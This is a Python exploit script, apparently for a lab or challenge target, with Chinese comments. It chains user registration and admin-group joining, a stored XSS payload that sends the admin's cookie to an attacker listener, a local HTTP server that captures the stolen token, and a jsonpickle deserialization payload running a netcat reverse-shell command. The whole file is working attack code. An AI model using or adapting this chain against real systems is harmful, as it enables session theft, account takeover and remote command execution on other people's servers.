import requests
import asyncio
from bs4 import BeautifulSoup
import sys
import websockets
from aiohttp import web
import urllib.parse

def create_user(base_url, username, password):
    jData = { "username": username, "email": username + "@gmail.com","password": password, "full_name":username }
    req_stat = requests.post("%s/user/create" %base_url,json=jData).status_code
    if not req_stat:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()
    return True

def login(base_url, username, password):
    data = f"username={username}&password={password}&submit=Login"
    headers= {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}
    token = requests.post("%s/token" %base_url,data=data,headers=headers).json().get('access_token')
    
    if not token:
        print("Something went wrong while logging in!")
        sys.exit()
    return token

def join_group(base_url, token):
    cookies = {"token": token, "username": "carlos"}
    JWT = "Bearer " + token
    headers= {"Authorization": JWT}

    req_stat = requests.post("%s/group/join?address=admin" %base_url,headers=headers,cookies=cookies).status_code
    if not req_stat == 200:
        print("Something went wrong while joining group!")
        sys.exit()
    return

async def send_xss_message(base_url, token, group_id, lhost):
    ws_url = "ws://%s/send-message?token=%s&group_id=%s" % (base_url.replace("http://",""), token, group_id)
    
    try:
        async with websockets.connect(ws_url) as websocket:
            print("✅ WebSocket连接成功")
            message = "<img src=1 onerror=fetch('%s?cookie='+document.cookie)>" % lhost
            await websocket.send(message)
            print(f"📤 消息已发送: {message}")
            
    except Exception as e:
        print(f"❌ WebSocket连接失败: {e}")

cookie_result = None

async def handle_cookie(request):
    global cookie_result
    cookie = request.rel_url.query.get('cookie')
    if cookie:
        print(f'[~] cookie arrived: {cookie}')
        cookie_result = cookie
        return web.Response(text='ok')
    return web.Response(text='no cookie')

async def start_server():
    app = web.Application()
    app.router.add_get('/', handle_cookie)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 80)  # 监听 8080 端口
    await site.start()
    print('[+] HTTP server started on 0.0.0.0:80')

def unserialized_payload(base_url, admin_token, command):
    cookies = {"token": admin_token, "username": "admin"}
    headers = {"Content-Type": "application/json","Authorization": "Bearer " + admin_token}
    jData = {
        "notification_frequency": {
            "py/reduce": [{"py/function": "os.system"},[command]]
        }
    }
    req_stat = requests.post("%s/api/update-preferences?user_id=10" %base_url,json=jData,headers=headers,cookies=cookies).status_code
    if not req_stat == 200:   
        print("Something went wrong while sending unserialized payload!")
        sys.exit()
    else:
        print("[+] Unserialized payload sent!")
        print("[+] Trigger the payload by visiting the admin preferences page!")
        requests.get("%s/api/get-preferences?user_id=10" %base_url,headers=headers,cookies=cookies)

    return

if __name__ == "__main__":
    base_url = "http://192.168.149.245:8000"
    username = "carlos5" # 任意用户名, 每一次执行用户名需要变更
    password = "carlos5" # 任意密码
    lhost = "192.168.45.234" # 修改为反弹shell的ip
    lport = "443"
    command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
    group_id = 13 # admin组的ID, 可以通过抓包获取

    async def main():
        global cookie_result
        
        if create_user(base_url, username, password):
            print("[+] User created")
        print("[+] Logging in")
        token = login(base_url, username, password)
        print(f"[+] Logged in with JWT: {token}")
        print("[+] Joining admin group")
        join_group(base_url, token)
        print("[+] Sending XSS message")
        await send_xss_message(base_url, token, group_id, f"http://{lhost}")
        print("[+] Waiting for cookie to arrive on webhook..")
        
        # 启动异步HTTP服务
        await start_server()
        
        # 等待cookie到达
        try:
            while not cookie_result or 'username=admin' not in cookie_result:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        
        cookie_parts = cookie_result.split(';')
        for part in cookie_parts:
                part = part.strip()
                if part.startswith('token='):
                    token_value = part.split('=', 1)[1]
                    # URL解码token值
                    token_value = urllib.parse.unquote(token_value)
                    print(f'[~] Admin Token: {token_value}')
                    break
        print("[+] Sending unserialized payload")
        unserialized_payload(base_url, token_value, command)
        print("[+] Done")

    # 运行主异步函数
    asyncio.run(main())